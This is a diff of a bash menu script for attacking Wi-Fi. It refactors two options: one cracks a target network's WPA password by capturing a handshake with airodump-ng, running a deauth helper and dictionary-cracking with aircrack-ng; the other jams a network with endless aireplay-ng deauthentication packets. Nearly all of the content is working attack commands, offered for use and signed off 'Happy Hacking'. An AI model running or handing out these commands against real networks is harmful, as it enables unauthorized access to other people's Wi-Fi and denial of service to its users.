@@ -30,7 +30,17 @@ echo "      $(tput setaf 1)[$(tput setaf 4)1$(tput setaf 1)] $(tput setaf 2)Wifi
 echo "      $(tput setaf 1)[$(tput setaf 4)2$(tput setaf 1)] $(tput setaf 2)Wifi Jammer"
 echo -e "      $(tput setaf 1)[$(tput setaf 4)3$(tput setaf 1)] $(tput setaf 2)Exit\n\n$(tput setaf 7)"
 }
-
+hacking () {
+airmon-ng start wlan0 > /dev/null
+trap "airmon-ng stop wlan0mon > /dev/null" EXIT
+airodump-ng wlan0mon
+read -p "Enter the network BSSID > " bssid
+read -p "Enter the corresponding Channel > " ch
+}
+if [ $(dpkg-query -W -f='${Status}' aircrack-ng 2>/dev/null | grep -c "ok installed") -eq 0 ];
+then
+sudo apt-get install aircrack-ng;
+fi
 logo
 option
 while true; do
@@ -40,33 +50,20 @@ case $number in
   1) clear
 logo
 start
-airmon-ng start wlan0
-airodump-ng wlan0mon
-read -p "Enter the target network BSSID > " bssid
-read -p "Enter the target Channel > " ch
+hacking
 x-terminal-emulator -e ./airplay.sh $bssid
 airodump-ng --bssid $bssid --channel $ch wlan0mon -w files 
 aircrack-ng -w dictionary/dictionary.txt files-01.cap
-set echo off
-airmon-ng stop wlan0mon
-rm files-01.cap files-01.csv files-01.kismet.csv files-01.kismet.netxml files-01.log.csv
+airmon-ng stop wlan0mon > /dev/null
+rm files*
 logo
 option
     ;;
   2) clear
 logo
 start
-airmon-ng start wlan0
-airodump-ng wlan0mon
-read -p "Enter the network BSSID > " bssid
-read -p "Enter the corresponding Channel > " ch
-airodump-ng --bssid $bssid --channel $ch wlan0mon -w files
-trap ctrl_c INT
-function ctrl_c() {
-airmon-ng stop wlan0mon
-rm files-01.cap files-01.csv files-01.kismet.csv files-01.kismet.netxml files-01.log.csv
-exit
-}
+hacking
+airodump-ng --bssid $bssid --channel $ch wlan0mon
 aireplay-ng -0 0 -a $bssid wlan0mon 
     ;;
   3) echo -e "$(tput setaf 1)\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
